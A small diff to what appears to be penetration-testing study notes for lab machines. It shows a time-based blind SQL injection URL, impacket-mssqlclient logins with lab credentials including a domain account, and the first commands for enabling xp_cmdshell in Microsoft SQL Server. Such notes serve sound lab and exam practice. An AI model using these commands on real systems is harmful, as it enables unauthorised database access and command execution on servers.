@@ -1272,7 +1272,10 @@ http://192.168.50.16/blindsqli.php?user=offsec' AND IF (1=1, sleep(3),'false') -
 - Manual Code Execution
 
 ```
-kali> impacket-mssqlclient Administrator:Lab123@192.168.50.18 -windows-auth #To login
+#To login
+kali> impacket-mssqlclient Administrator:Lab123@192.168.50.18 -windows-auth 
+or
+impacket-mssqlclient hokkaido-aerospace.com/info:info@dc.hokkaido-aerospace.com -windows-auth
 EXECUTE sp_configure 'show advanced options', 1;
 RECONFIGURE;
 EXECUTE sp_configure 'xp_cmdshell', 1;
